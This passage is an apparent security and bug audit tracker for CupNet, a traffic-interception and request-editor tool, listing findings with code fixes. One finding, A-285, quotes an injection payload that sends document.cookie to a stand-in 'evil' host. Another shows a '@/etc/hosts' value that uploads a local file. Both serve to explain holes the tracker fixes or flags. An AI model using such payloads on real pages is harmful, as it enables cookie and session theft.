# CupNet — Audit findings (2026-09)

Generated by a multi-agent read-only audit (12 subsystem passes + 4 cross-cutting lenses, every finding independently verified against the working-tree code). This is a defect + hardening tracker; the architecture reference is [PROJECT_MAP.md](PROJECT_MAP.md) and the upgrade path is [PRODUCTION_PLAN.md](PRODUCTION_PLAN.md).

> **Baseline for this audit:** the working tree carries large uncommitted security-hardening work (vault/profile-gate, trusted-sender IPC guard, traffic-log encryption, preload-view split). A backup of that WIP is in git ref `refs/backup/pre-claude-audit-2026-09-23`. Many findings below are **regressions from that in-progress refactor** (e.g. the tab preload lost the Settings APIs; encrypted log rows lose headers on export; vault key migration can orphan data). They are marked _WIP_.

## Summary

| Severity | Count |
|---|---|
| 🔴 Critical | 10 |
| 🟠 High | 49 |
| 🟡 Medium | 134 |
| ⚪ Low | 199 |
| **Total (deduplicated)** | **392** |

Category spread: correctness 151, security 55, ux-broken 45, data-loss 44, race 20, compat 14, ipc-contract 12, error-handling 11, perf 10, test-infra 10, leak 9, build 6, packaging 5.

Each finding keeps a stable **ID** (`A-###`). When fixing, update the **Status** column here (open → fixed/wontfix) and reference the ID in the commit.

## Findings by subsystem

### Tools A (editor/rules/analyzer)

#### A-039 🟠 API Scout never starts: ReferenceError on undefined `_cupnetRoot`
- **Where:** `main-process/services/sub-windows.js:515` · **Category:** correctness · **Status:** ✅ FIXED 2026-09-23 — `_cupnetRoot`→`d.cupnetRoot` in sub-windows.js:515 (packaged-path cwd concern noted separately, still open).
- **Impact:** Open API Scout and click Start. The log shows '[ui] failed to start: _cupnetRoot is not defined' and no child process is ever spawned.
- **Fix:** sub-windows.js:515: change `cwd: _cupnetRoot` to `cwd: d.cupnetRoot`. Separately, for packaged builds, move cwd and the _debug dump dir (lines 559 and launcher-ipc.js:102) to a writable path such as d.app.getPath('userData'), because d.cupnetRoot resolves inside app.asar (package.json build.asar=true).
- _Reported 5× (also: x-electron-compat, core-runtime, tabs-shell-main, build-ci-tests)_

#### A-048 🟠 Request Editor collections unusable: window.prompt() throws in Electron
- **Where:** `request-editor-renderer.js:1317` · **Category:** ux-broken · **Status:** ✅ FIXED 2026-09-23 — request-editor + cookie-manager use askText() dialog (credentials part deferred to WIP).
- **Impact:** Click Save or press Cmd+S. An uncaught 'prompt() is not supported.' appears in the console, nothing is saved, and the Collections list stays empty.
- **Fix:** Add a small shared DOM prompt helper, for example `askText(label, defaultValue) => Promise<string|null>` built on a <dialog> with an <input> (type=password for the vault prompts). Base it on the existing overlay in log-viewer-renderer.js:1216 or notes-renderer.js:70. Replace every prompt() call with `await askText(...)` in request-editor-renderer.js (1219, 1304, 1317), cookie-manager-renderer.js (69, 85, 102) and credentials-renderer.js (512, 625, 1216, 1245, 1266, 1356).
- _Reported 2× (also: same area)_

#### A-049 🟠 Typing a URL with a query string and pressing Enter drops the query (stale params)
- **Where:** `request-editor-renderer.js:803` · **Category:** correctness · **Status:** ✅ FIXED 2026-09-23 — sendRequest syncs params from the URL query before building when "?" present (request-editor-renderer.js).
- **Impact:** In a fresh editor, type https://api.example.com/search?q=test and press Enter. The request goes to https://api.example.com/search with no query, or with the previous request's params appended.
- **Fix:** At the top of sendRequest (before buildUrlWithParams), sync params from the URL field when it contains a query. For example: `if (urlIn.value.includes('?')) parseUrlToParams(urlIn.value);`. For a less lossy version, merge parsed params with the existing disabled rows (see finding 1). Alternatively add a debounced urlIn 'input' listener that calls the same merge.

#### A-051 🟠 Editing and saving a disabled rule silently re-enables it (enabled is 0/1, not boolean)
- **Where:** `rules.js:727` · **Category:** correctness · **Status:** ✅ FIXED 2026-09-23 — parseInterceptRuleRow now normalizes enabled/stop_on_match/breakpoint_enabled to booleans in db.js.
- **Impact:** Disable a 'mock payment API' rule, open it and fix a typo in the name, then Save. The rule is active again and starts mocking live traffic. Toggling 'enabled' on a rule with 'stop on match' unchecked re-checks stop_on_match.
- **Fix:** In db.js parseInterceptRuleRow, normalize before returning: `r.enabled = !!r.enabled; r.stop_on_match = r.stop_on_match !== 0 && r.stop_on_match !== false; r.breakpoint_enabled = !!r.breakpoint_enabled;`. As defence in depth, change interceptRuleToRow to `enabled: (rule.enabled === undefined ? true : !!rule.enabled) ? 1 : 0` and `stopOn = (rule.stop_on_match === undefined ? true : !!rule.stop_on_match) ? 1 : 0`.
- _Reported 2× (also: tool-windows-b)_

#### A-080 🟡 API Scout overwrites the user-entered target URL every second
- **Where:** `ivac-scout-renderer.js:128` · **Category:** ux-broken · **Status:** ✅ FIXED 2026-09-23 — API Scout keeps the user-typed URL; string translated.
- **Impact:** Type https://example.org/ into Target URL and click Start. refreshContext replaces the value with the active tab URL before `const url = targetUrlInput.value` is read, and the scout runs against the wrong site.
- **Fix:** Add `let urlEdited = false; targetUrlInput.addEventListener('input', () => { urlEdited = true; });` and change line 128 to `if (!urlEdited && isHttpUrl(ctx.url)) targetUrlInput.value = ctx.url;`. Also remove `await refreshContext();` from the Start handler (line 135), or make it skip the URL assignment. Translate the string on line 142 to English.

#### A-098 🟡 HTTP Lab re-inject leaves the old keydown handler live: Ctrl/Cmd+Enter sends twice (stale panel) and hijacks page shortcuts
- **Where:** `main-process/injected/page-http-lab.inject.js:668` · **Category:** leak · **Status:** open
- **Impact:** Open HTTP Lab from the context menu twice and press Ctrl+Enter: two requests go out, one with the old URL and body. Minimize the lab and press Ctrl+Enter in the site's comment box: the site's submit is blocked and an unintended credentialed request is sent.
- **Fix:** At the top of cupnetPageHttpLab, call `try { window.__cupnetHttpLabCleanup?.(); } catch (_) {}`. Register every document/window listener through a local list and set `window.__cupnetHttpLabCleanup = () => listeners.forEach(([t, ev, fn]) => t.removeEventListener(ev, fn));`. In _keyHandler, add `if (root.hidden || !root.isConnected || !root.contains(e.target)) return;` before handling Ctrl+Enter and Escape.

#### A-109 🟡 Binary responses corrupted: body decoded as UTF-8 text, image preview built from string
- **Where:** `main-process/ipc/handlers/log-compare-execute-ipc.js:444` · **Category:** correctness · **Status:** open
- **Impact:** GET a PNG. The Image tab shows a broken image, the size is wrong, and 'Copy body' copies garbage.
- **Fix:** In execute-request, also return `bodyBase64`. On the worker path pass `res.bodyBase64` through. On the fetch path use `const buf = Buffer.from(await resp.arrayBuffer()); bodyBase64 = buf.toString('base64'); text = buf.toString('utf8')`. In renderResponse, when `r.bodyBase64` is present, build the image Blob from `Uint8Array.from(atob(r.bodyBase64), c => c.charCodeAt(0))` and compute Size from that byte length (or `Math.floor(b64.length*3/4) - padding`).

#### A-116 🟡 Page Analyzer runs detectable main-world scripts every 3 s by default
- **Where:** `main-process/ipc/handlers/page-analyzer-ipc.js:16` · **Category:** compat · **Status:** ✅ FIXED 2026-09-23 — passive analysis runs in an isolated world; auto off by default.
- **Impact:** On an anti-bot protected site, leaving Page Analyzer open produces periodic querySelectorAll('form') and getComputedStyle calls on every field plus full localStorage enumeration. The site's hooks flag the session.
- **Fix:** Replace executeJavaScript(...) with executeJavaScriptInIsolatedWorld(ANALYZER_WORLD_ID /* e.g. 999 */, [{ code: ... }]) in analyze-page-forms, analyze-page-captcha, analyze-page-meta and analyze-page-storage. The isolated world shares the DOM and storage but not the page's JS prototypes. Also remove `checked` from #pa-auto in page-analyzer.html:586, or run the periodic job only when the tab's URL or load state changes.

#### A-119 🟡 Importing a rules file silently installs executable script rules (main-process vm, no confirmation)
- **Where:** `main-process/ipc/handlers/rules-ipc.js:152` · **Category:** security · **Status:** ✅ FIXED 2026-09-23 — covered by A-050 (imported script rules are forced disabled).
- **Impact:** A user imports a shared 'cupnet-intercept-rules.json' containing a script rule with url_pattern '*'. The next request runs attacker code with full access to the machine, including the vault and credentials.
- **Fix:** In import-intercept-rules, force `enabled: false` for any rule with `type === 'script'` (or for all imported rules), and count them. Before saving, call dialog.showMessageBox listing the script rules (name and url_pattern) and require an explicit 'Import' click. Return { ok:true, imported, disabledScripts } so rules.js can tell the user which script rules were imported disabled.

#### A-133 🟡 Page Analyzer forms scan breaks on DOM-clobbered forms (name="action"/"method"/"id")
- **Where:** `main-process/services/page-analyzer-injected-scripts.js:7` · **Category:** correctness · **Status:** ✅ FIXED 2026-09-23 — forms scan uses getAttribute/querySelectorAll + per-form try/catch.
- **Impact:** On a page whose form contains <input type="hidden" name="action" value="login">, the Forms tab shows 0 forms for every form on the page, and 'Open & import all page forms' in HTTP Lab fails to open.
- **Fix:** In _analyzeFormsScript, read the values with getAttribute and wrap each form in try/catch: `var a=form.getAttribute('action'); var f={index:fi,id:form.getAttribute('id')||'',name:form.getAttribute('name')||'',action:a?new URL(a,document.baseURI).href:location.href,method:String(form.getAttribute('method')||'GET').toUpperCase(),className:String(form.getAttribute('class')||''),fields:[]};`. Use `HTMLFormElement.prototype.__lookupGetter__('elements').call(form)` or `form.querySelectorAll('input,select,textarea,button')` instead of form.elements, because name="elements" also clobbers it. Put the per-form body in try{...}catch(e){} so one bad form cannot drop the others. Make the same getAttribute-based change in readFormElement in main-process/injected/page-http-lab.inject.js:217.

#### A-134 🟡 HTTP Lab active-state tracking never works (Number() on string tab ids)
- **Where:** `main-process/services/page-http-lab.js:25` · **Category:** correctness · **Status:** ✅ FIXED 2026-09-23 — HTTP Lab keys tabs by string.
- **Impact:** Open HTTP Lab, submit a form and let the page navigate. The lab does not come back on the new page, even though the injected code and UI promise 'HTTP Lab restored'.
- **Fix:** In page-http-lab.js, add `function key(t){ return t == null ? '' : String(t); }`. In setHttpLabActive use `const id = key(tabId); if (!id) return;`, and in isHttpLabActive use `httpLabActiveTabIds.has(key(tabId))`. Change the JSDoc to Set<string>.

#### A-148 🟡 API Scout spawns system `node` in packaged builds (wrong isPackaged check)
- **Where:** `main-process/services/sub-windows.js:506` · **Category:** packaging · **Status:** open
- **Impact:** On a user machine without Node.js installed, once the cwd bug is fixed, Start emits a spawn ENOENT error and ivac-scout-done{ok:false}.
- **Fix:** Replace line 508 with `const isPackaged = !!d.app?.isPackaged;`, keeping the existing nodeBin/env logic.

#### A-168 🟡 Storage 'Write to page' can apply one tab's snapshot to a different tab (replace semantics wipe keys) _(WIP)_
- **Where:** `page-analyzer-renderer.js:838` · **Category:** data-loss · **Status:** open
- **Impact:** Analyze tab A, turn Auto off, select tab B, and click 'Write to page' on localStorage. Tab B's localStorage is replaced by tab A's (same-origin tabs, or even a different origin), destroying B's session data.
- **Fix:** In appendStorageInspector/renderStorage, capture the tabId (and _lastMeta.url) that the snapshot was taken from, for example by storing _lastStorageTabId = tabId in runAnalysis next to _lastStorage. Pass it into applyStorageToPage and use it instead of getSelectedTabId(). If it differs from getSelectedTabId(), abort with a status message ("Snapshot is from another tab — refresh first").

#### A-169 🟡 Storage editor: unapplied JSON edits discarded by auto-refresh; apply deletes keys added since the snapshot
- **Where:** `page-analyzer-renderer.js:986` · **Category:** data-loss · **Status:** open
- **Impact:** Edit the localStorage JSON, click the tree to inspect a key, and within 3 s the edits are gone. Or edit slowly: when you click Apply, a token the page stored in the meantime is deleted.
- **Fix:** Add a per-store dirty flag, e.g. _storageDirty = {session:false, local:false}. Set it on the textarea 'input' event and clear it on successful apply, on Reset, and on a tab change. In runAnalysis, skip renderStorage (or keep the existing textarea value) while either store is dirty. Remove the '_storageEditorActiveCount = 0' reset from renderMeta. Optionally make apply diff-based: send only the keys changed or removed relative to the rendered snapshot, not a full replace.

#### A-173 🟡 Code generator emits invalid or incorrect code (Python unquoted, Go unused import, shell/PHP interpolation)
- **Where:** `request-editor-codegen.js:62` · **Category:** correctness · **Status:** open
- **Impact:** Choose Python for any request. Running the snippet raises SyntaxError. The cURL snippet for body {"price":"$5"} sends {"price":""}.
- **Fix:** Python: add `const pyStr = s => "'" + escPy(s).replace(/\n/g,'\\n').replace(/\r/g,'\\r') + "'"` and use pyStr() for the method, url, header keys and values, and data. Go: include the "strings" import line only when the body branch is taken. cURL: use single-quote escaping, `const sq = s => "'" + String(s).replace(/'/g, "'\\''") + "'"`, instead of escJs. PHP: use single-quoted literals, `"'" + String(s).replace(/\\/g,'\\\\').replace(/'/g,"\\'") + "'"`. axios: wrap the body in `(async () => { ... })();`, and do the same for fetch if the snippet is meant to run under CJS.

#### A-174 🟡 cURL import mis-parses common input (Chrome $'…', -d without -X, -x proxy, extra URLs)
- **Where:** `request-editor-curl-parser.js:26` · **Category:** correctness · **Status:** open
- **Impact:** Paste Chrome's `curl 'https://a.com/api' -H 'content-type: application/json' --data-raw $'{"a":"it\'s"}'`. The import yields method GET and body '$', and Send issues a bodyless GET.
- **Fix:** (1) Test the raw token case-sensitively for -X/-H/-d/-b/-u (e.g. `t === '-X' || low === '--request'`), and skip one argument for -x/--proxy, -e/--referer (map to a Referer header), -A/--user-agent (map to User-Agent), -o, --connect-timeout, and similar. (2) Keep `let explicitMethod=false`; after parsing, `if(!explicitMethod && bodyParts.length) method='POST'`. (3) Collect data values in an array and join with '&'. Handle --data-urlencode by encoding the value part. Handle -F/--form by building multipart form fields, or at least by setting POST. (4) In tokenizeCurl, when c === '$' and the next char is "'", enter ANSI-C mode and decode \\n, \\t, \\', \\\\, \\xHH, and \\uHHHH until the closing "'". (5) Set url only from --url or the first positional argument (`if(!url)`), not from any http-looking token.

#### A-175 🟡 Param table edits bake env variables into the URL, drop {{vars}} in params and lose disabled params
- **Where:** `request-editor-renderer.js:216` · **Category:** data-loss · **Status:** open
- **Impact:** With env {baseUrl:'https://api.x'}, set the URL to {{baseUrl}}/a and add the param token={{tok}}. The URL field becomes https://api.x/a?token=%7B%7Btok%7D%7D. Uncheck a param and click elsewhere, and the param disappears.
- **Fix:** (a) In buildUrlWithParams, encode the templated values: `${encodeURIComponent(applyTemplate(p.key))}=${encodeURIComponent(applyTemplate(p.value))}`. (b) Add a display-only builder for onChange that uses the raw base (no applyTemplate) plus raw active params, and use it at line 338 (`urlIn.value = buildDisplayUrl()`). (c) In parseUrlToParams, keep the existing rows with on:false (append them after the parsed active rows) instead of replacing state.params outright.

#### A-176 🟡 Double send via Cmd/Ctrl+Enter in URL field; sendRequest has no in-flight guard
- **Where:** `request-editor-renderer.js:1562` · **Category:** race · **Status:** ✅ FIXED 2026-09-23 — sendRequest in-flight guard (token + flag), Enter excludes meta/ctrl.
- **Impact:** Press Cmd+Enter in the URL bar. Two identical requests are sent (for example a POST that creates two orders) and two history entries appear. The second request cannot be cancelled after the first returns, and the older response may overwrite the newer one.
- **Fix:** Add `if (currentCancelToken) return;` as the first line of sendRequest. For multipart, which awaits before the token is set, also set a local `sending` flag at the start. Change line 803 to `urlIn.addEventListener('keydown', e => { if (e.key === 'Enter' && !e.metaKey && !e.ctrlKey) sendRequest(); });`.

#### A-177 🟡 Reopening the editor from the toolbar wipes the in-progress request (partial initFromData reset) _(WIP)_
- **Where:** `request-editor-renderer.js:1504` · **Category:** data-loss · **Status:** open
- **Impact:** Build a POST with headers and a JSON body, then click the Request Editor toolbar button again. The method silently becomes GET and all headers are gone. Opening a logged GET after a POST keeps the old POST body and bodyType.
- **Fix:** In sub-windows.js openRequestEditorWindow, when the window already exists and `data == null`, only show and focus it (return before send). In log-compare-execute-ipc.js, pass null through for the toolbar case rather than the empty object. Alternatively, have initFromData return early on a payload with an empty url, empty body and no headers. For real prefills, reset in initFromData before applying the payload: `state.params=[]; state.formFields=[]; state.multipart=[]; state.bodyType='none'; setBodyText(''); document.querySelector('[name=btype][value=none]').checked=true;`, and set `urlIn.value = data.url || ''`.

#### A-180 🟡 Rules reorder only renumbers visible rules and group moves revert the new priority
- **Where:** `rules.js:883` · **Category:** correctness · **Status:** ✅ FIXED 2026-09-23 — reorder filter-aware; group move keeps new priority.
- **Impact:** With a search filter showing 2 of 10 rules, drag one above the other. They get priorities 200 and 100, colliding with hidden rules. Or drag a rule into another group: its priority snaps back to the pre-drag value, and 'first match wins' order is not what the list shows.
- **Fix:** In onEnd, build a map from pairs (id -> priority) and push {...rule, group_name: gNorm, priority: prioMap.get(rid)} into groupUpdates. Also disable Sortable (or skip reorder) whenever a search, type, group or tag filter is active, e.g. `if (getFilteredRules().length !== allRules.length) { showMsg('Clear filters to reorder', true); await loadRules(); return; }`. Optionally order the groups in renderRuleList by the maximum priority inside each group, not by name.

#### A-181 🟡 Arrow keys in any form field switch the selected rule and discard unsaved edits
- **Where:** `rules.js:1210` · **Category:** ux-broken · **Status:** ✅ FIXED 2026-09-23 — arrow keys ignored while editing a field.
- **Impact:** Edit the URL pattern, then press ArrowDown to move the caret or change the status number. The editor jumps to the next rule and every unsaved change is lost.
- **Fix:** At the start of the Arrow branch, add: `const t = e.target; if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA' || t.tagName === 'SELECT' || t.isContentEditable || t.closest?.('.monaco-editor'))) return;`

#### A-182 🟡 'Slow network (2s)' template blocks requests with 403 instead of delaying
- **Where:** `rules.js:352` · **Category:** correctness · **Status:** ✅ FIXED 2026-09-23 — slow-network template is now a pass-through modifyHeaders rule that only delays.
- **Impact:** Create the 'Slow network' template for *example.com*. Every matching request fails with 403 after 2 s instead of loading slowly.
- **Fix:** Change the template to a pass-through type: `type: 'modifyHeaders', params: { requestHeaders: {}, responseHeaders: {} }, delay_ms: 2000`. First confirm that a modifyHeaders rule with empty params still applies delay_ms on the MITM path, which it does because the delay is applied before the type branch.

#### A-183 🟡 Editing a modifyHeaders rule drops removeRequestHeaders/removeResponseHeaders
- **Where:** `rules.js:686` · **Category:** data-loss · **Status:** ✅ FIXED 2026-09-23 — modifyHeaders save preserves removeRequest/ResponseHeaders lists.
- **Impact:** Create 'Strip Content-Security-Policy' from the template, change its URL pattern, and Save. The rule's params become {requestHeaders:{},responseHeaders:{}} and CSP is no longer stripped.
- **Fix:** In collectRuleFromForm's modifyHeaders branch, keep the existing lists: `const prevP = (idRaw && allRules.find(x => x.id === Number(idRaw))?.params) || {}; if (Array.isArray(prevP.removeRequestHeaders)) params.removeRequestHeaders = prevP.removeRequestHeaders; if (Array.isArray(prevP.removeResponseHeaders)) params.removeResponseHeaders = prevP.removeResponseHeaders;`. A better fix is to add editable fields for the two remove lists in fillEditor and in the form.

#### A-266 ⚪ HTTP Lab send errors before fetch are swallowed with no feedback
- **Where:** `main-process/injected/page-http-lab.inject.js:645` · **Category:** error-handling · **Status:** open
- **Impact:** Choose multipart with a file row but no file selected and press SEND. Nothing happens: no status, no log and no toast.
- **Fix:** In submit(), wrap everything after `const statusEl = ...` in try/catch: `catch (e) { if (!e.__cnLogged) { logAppend('err', 'Request not sent', e.message || String(e)); if (statusEl) statusEl.textContent = 'Error: ' + (e.message || e); } throw e; }`. Set e.__cnLogged = true in the existing fetch catch so the error is not logged twice.

#### A-267 ⚪ HTTP Lab 'import all page forms' ignores form action/method and only reads the first form; arrays collapsed
- **Where:** `main-process/injected/page-http-lab.inject.js:265` · **Category:** correctness · **Status:** open
- **Impact:** 'Open & import all page forms' on a login page leaves the URL as the current page path and GET, so SEND issues a GET without the form body. A multi-checkbox 'tags[]' field keeps one value.
- **Fix:** In mergePageIntoConfig, take the action from `const src = scope === 'primary' ? page.primary : (page.primary || page);` so 'all' mode also picks up the action, method and body mode of the primary form, or iterate page.forms and merge each form's fields. For repeated names, have readFormElement collect rows in an array ({name, value} pairs, pushing each checked or duplicated input) rather than an object keyed by name. Then merge by appending rows, not by overwriting through Map-by-name.

#### A-280 ⚪ Request Editor: timeout reported as 'Cancelled'; body read is outside timeout/cancel; worker request not aborted
- **Where:** `main-process/ipc/handlers/log-compare-execute-ipc.js:499` · **Category:** error-handling · **Status:** open
- **Impact:** Request a stalled endpoint. After 30 s the UI says 'Cancelled' instead of 'Timed out'. For an endpoint that streams forever, the Send button spins permanently. A cancelled POST in MITM mode is still delivered.
- **Fix:** Fetch path: add `let timedOut=false; const timer=setTimeout(()=>{timedOut=true;ctrl.abort();},timeoutMs);`, and in the catch report error: timedOut ? `Timeout (${timeoutMs}ms)` : 'Cancelled', with cancelled: !timedOut. Move clearTimeout(timer) and cleanupExec() after `const text = await Promise.race([resp.text(), cancelPromise]);`, inside try/finally. MITM path: have worker.request return or expose its id, add worker.cancel(id) that deletes the pending entry, rejects it, and optionally sends {id, cancel:true} to the Go worker. Set execState.abort = () => worker.cancel(id).

#### A-284 ⚪ Endpoint Scout script fetch: body read not bounded by timeout; page-controlled URLs of any scheme fetched sequentially
- **Where:** `main-process/ipc/handlers/page-analyzer-ipc.js:317` · **Category:** error-handling · **Status:** ✅ FIXED 2026-09-23 — Endpoint Scout reads body under timeout and skips non-http(s) URLs.
- **Impact:** A page that includes a streaming or very large script makes Explore spin forever. `<script src="file:///…">` makes CupNet read local files into the analyzer view.
- **Fix:** Move clearTimeout until after the body has been read, e.g. `try { resp = await sess.fetch(...); body = await resp.text(); } finally { clearTimeout(timer); }`, or read via resp.body with a byte cap such as MAX_SCRIPT_CHARS. Before fetching, skip any URL whose `new URL(u).protocol` is not 'http:' or 'https:'. Optionally add an overall deadline and cap the number of scripts.

#### A-285 ⚪ page-analyzer-action interpolates action.type unescaped into page-executed script
- **Where:** `main-process/ipc/handlers/page-analyzer-ipc.js:354` · **Category:** security · **Status:** ✅ FIXED 2026-09-23 — page-analyzer-action JSON.stringifies action.type.
- **Impact:** action.type = "x';fetch('https://evil/'+document.cookie);'" runs attacker code in the target tab's origin.
- **Fix:** Replace line 354 with `var act=${JSON.stringify(String(action?.type || ''))};` and reject types outside ['focus','show','hide','toggle-disabled','toggle-password-visibility','set-value'] before building the script. Optionally register the handler as ctx.ipcMain.handle('page-analyzer-action', guardIpcHandler('page-analyzer-action', async (...) => ...)).

#### A-305 ⚪ Captcha detection reports bogus reCAPTCHA v2 for every Turnstile/hCaptcha widget
- **Where:** `main-process/services/page-analyzer-injected-scripts.js:65` · **Category:** correctness · **Status:** ✅ FIXED 2026-09-23 — reCAPTCHA selector excludes Turnstile/hCaptcha; inline Turnstile gated.
- **Impact:** On a Turnstile-only page, the analyzer shows 1 Turnstile and 1 reCAPTCHA v2 with the Turnstile sitekey, and totalCount is 2.
- **Fix:** Line 65: `document.querySelectorAll('.g-recaptcha, [data-sitekey]:not(.cf-turnstile):not(.h-captcha):not([data-hcaptcha-widget-id]):not([data-turnstile-widget-id])')`. Lines 186-196: call addTurnstile only when `/^0x/.test(mSitekey[1]) || txt.indexOf('turnstile') !== -1`.

#### A-306 ⚪ HTTP Lab / Web Request Tools offered on internal error page; duplicate 'Copy' menu item
- **Where:** `main-process/services/page-http-lab.js:12` · **Category:** correctness · **Status:** open
- **Impact:** Right-click on a tab's error page: 'Web Request Tools' appears and injects the lab into the internal page. Right-click selected text in an input: the menu shows Copy twice.
- **Fix:** Add 'error-page.html' to INTERNAL_FILE_MARKERS (or reuse isTabErrorPageUrl from tab-error-page.js). In the menu, remove the copy push at line 158 and push Copy once: `if (params.isEditable) { cut; copy; paste } else { copy }`, dropping the separate selectionText push at 153-155.

#### A-346 ⚪ Inline edit counter can stick >0, permanently disabling auto-refresh
- **Where:** `page-analyzer-renderer.js:388` · **Category:** correctness · **Status:** ✅ FIXED 2026-09-23 — renderForms resets _inlineEditCount.
- **Impact:** Open an inline value editor and click Refresh. Auto-refresh stops forever, and changing the tab selector no longer updates the results.
- **Fix:** At the top of renderForms, after formsList.innerHTML = '', add `_inlineEditCount = 0;`, because every editor has just been removed from the DOM. Alternatively, compute the count as formsList.querySelectorAll('.pa-inline-edit-wrap').length in the runAnalysis guard.

#### A-347 ⚪ Endpoint Scout 'Explore' click silently ignored while an auto-refresh is in flight
- **Where:** `page-analyzer-renderer.js:139` · **Category:** ux-broken · **Status:** open
- **Impact:** Click 'Explore' with Auto on: roughly one click in several does nothing, and the user sees no status change.
- **Fix:** Add a `_pendingScout` flag. In runAnalysis, if _analysisInFlight is set and includeScout is true, set _pendingScout = true and return. In the finally block, if _pendingScout is set, clear it and call runAnalysis({ includeScout: true, force: true }). Have the scout button pass force:true so an open inline editor does not block it, and set statusEl.textContent = 'Scout queued…' whenever the request is deferred.

#### A-348 ⚪ User-facing UI text in Russian (violates English-only rule)
- **Where:** `page-analyzer-renderer.js:901` · **Category:** ux-broken · **Status:** ✅ FIXED 2026-09-23 — Page Analyzer Russian UI strings translated to English.
- **Impact:** An English-speaking user sees untranslated Russian labels and errors in Page Analyzer and API Scout.
- **Fix:** Translate these strings to English, for example 'Copy JSON', 'Write to page', 'Reset', 'Expected a JSON object like { "key": "value", ... }', 'No tab selected', 'applyPageStorage unavailable (update preload)', 'Write failed: ', 'Error: ', 'Tab data loaded into form', '${n} key(s)', 'Tree (read-only)', '✓ JSON copied', 'Reset to snapshot', 'Writing and reloading from tab…', 'Next steps', 'Run Scout and wait for the summary.', 'Open endpoints and build a request sequence in Request Editor.', 'Waiting for scan to finish and summary...', and an English version of the captcha auto-detection disclaimer.

#### A-353 ⚪ History entries alias live header/form state and change after being recorded
- **Where:** `request-editor-renderer.js:718` · **Category:** correctness · **Status:** ✅ FIXED 2026-09-23 — history snapshot no longer aliases live headers/formFields.
- **Impact:** Send with header X-Id: 1, then change it to 2 and send again. The first history entry now also shows X-Id: 2, so the history cannot replay the original request.
- **Fix:** In sendRequest, remove `headers: state.headers` and `formFields: state.formFields` from the pushHistorySnapshot override, since collectSnapshotBase already copies them via copyRows. Alternatively pass `copyRows(state.headers)` and `copyRows(state.formFields)`.

#### A-354 ⚪ Bulk-edit header changes are not sent unless the user toggles back to table view
- **Where:** `request-editor-renderer.js:423` · **Category:** correctness · **Status:** open
- **Impact:** Click 'Bulk edit', add 'Authorization: Bearer x' and click Send. The header is not sent.
- **Fix:** Add a `syncBulkHeadersFromTextarea()` helper that contains the parse logic from lines 423-430. Call it at the top of sendRequest, buildCurl, updateCodegenOut and pushHistorySnapshot/collectSnapshotBase when headersBulkMode is true, and reuse it in the toggle. To preserve disabled rows, write them as `# Key: value` lines on entry and parse `#`-prefixed lines back as `on: false`.

#### A-355 ⚪ Multipart send can produce two Content-Type headers with conflicting boundaries
- **Where:** `request-editor-renderer.js:764` · **Category:** correctness · **Status:** ✅ FIXED 2026-09-23 — multipart send strips pre-existing Content-Type before setting the new one.
- **Impact:** Open a logged multipart request (header 'content-type: multipart/form-data; boundary=OLD') and switch the body to form-data. Both headers are sent and the server may parse with the OLD boundary, so the upload fails.
- **Fix:** Before line 764, delete every Content-Type key in any casing: `for (const k of Object.keys(hdrObj)) if (k.toLowerCase() === 'content-type') delete hdrObj[k];`. Then assign `hdrObj['Content-Type'] = mp.contentType`.

#### A-356 ⚪ Import falls back to cURL parsing for non-v2.1 JSON and loads the Postman schema URL as the request
- **Where:** `request-editor-renderer.js:1431` · **Category:** correctness · **Status:** ✅ FIXED 2026-09-23 — unsupported JSON collection reports an error instead of falling back to cURL/schema-URL.
- **Impact:** Import a Postman v2.0 collection. The editor silently loads GET https://schema.getpostman.com/json/collection/v2.0.0/collection.json instead of reporting that the format is unsupported.
- **Fix:** In the import-apply handler, track whether JSON.parse succeeded. If it did and CupNetParsePostman returned null, show an alert such as 'Unsupported collection format (Postman v2.1 with at least one request is required)' and return without calling CupNetParseCurl. Optionally relax the schema check in parsePostmanCollectionV21 to accept '2.0' too, since the request shape is compatible for method, url, header and body.raw/urlencoded.

#### A-357 ⚪ Toolbar/response cURL export differs from what Send sends
- **Where:** `request-editor-renderer.js:980` · **Category:** correctness · **Status:** open
- **Impact:** Header 'Authorization: Bearer {{token}}' is copied literally. A form field value 'a&b=c' produces a different body in curl. A multipart value '@/etc/hosts' makes curl upload a local file.
- **Fix:** In buildCurl, apply applyTemplate to header values, JSON/raw bodies, form field values and multipart text values. Build the form-urlencoded string with encodeURIComponent on keys and values, as sendRequest does. Emit text parts with `--form-string 'k=v'` instead of -F. For json bodies, add -H 'Content-Type: application/json' when no Content-Type header is present. Change line 1010 to restore the original label (save `const orig = copyCurlBtn.textContent` before setting 'Copied', or use 'cURL').

#### A-358 ⚪ Stale response state after an error (Copy body, cookies, image remain from previous response)
- **Where:** `request-editor-renderer.js:941` · **Category:** correctness · **Status:** open
- **Impact:** A successful request is followed by one that fails. 'Copy body' copies the previous response, and the Cookies tab still lists the previous Set-Cookie values.
- **Fix:** In renderError, add: `respActions.innerHTML = ''; cntRespH.textContent = '0'; if (respCookiesTbody) { respCookiesTbody.innerHTML = ''; cookiesEmpty.style.display = ''; cookiesTableWrap.style.display = 'none'; } if (lastImageBlobUrl) { URL.revokeObjectURL(lastImageBlobUrl); lastImageBlobUrl = null; } imagePreviewImg.removeAttribute('src'); imagePreviewImg.style.display = 'none'; imagePreviewEmpty.style.display = ''; imagePreviewEmpty.textContent = 'No image in response'; if (htmlPreviewIframe) { htmlPreviewIframe.srcdoc = ''; htmlPreviewIframe.style.display = 'none'; } if (htmlPreviewEmpty) htmlPreviewEmpty.style.display = '';`

#### A-359 ⚪ Collections tree renders children detached from their folders; new folders always at root
- **Where:** `request-editor-renderer.js:1188` · **Category:** ux-broken · **Status:** open
- **Impact:** With folders A and B each holding requests, the list shows A, B, then A's and B's requests interleaved, so the user cannot tell which request belongs to which folder.
- **Fix:** In loadCollectionsTree, build a Map from parent_id to child rows, sort each sibling list by (sort_order, id), and render depth-first starting from the rows whose parent_id is null (depth = recursion level). In the new-folder handler, pass parent_id: selectedCollectionFolderId.

#### A-360 ⚪ Request Editor stores auth secrets in plaintext (history localStorage + collections table)
- **Where:** `request-editor-renderer.js:1110` · **Category:** security · **Status:** open
- **Impact:** Anyone with access to the profile directory can read every bearer token and password sent from the Request Editor in cleartext.
- **Fix:** In collectSnapshotBase, strip the secret fields (bearerToken, basicPass, apikeyValue, customValue) or replace them with a masked marker before writing history. Before storing auth_json for collections, either strip the secrets or encrypt them with the same at-rest helper the traffic-log and vault hardening uses.

#### A-364 ⚪ Rule history diff never works: preload does not expose formatInterceptRuleDiffHtml
- **Where:** `rules.js:1113` · **Category:** ipc-contract · **Status:** open
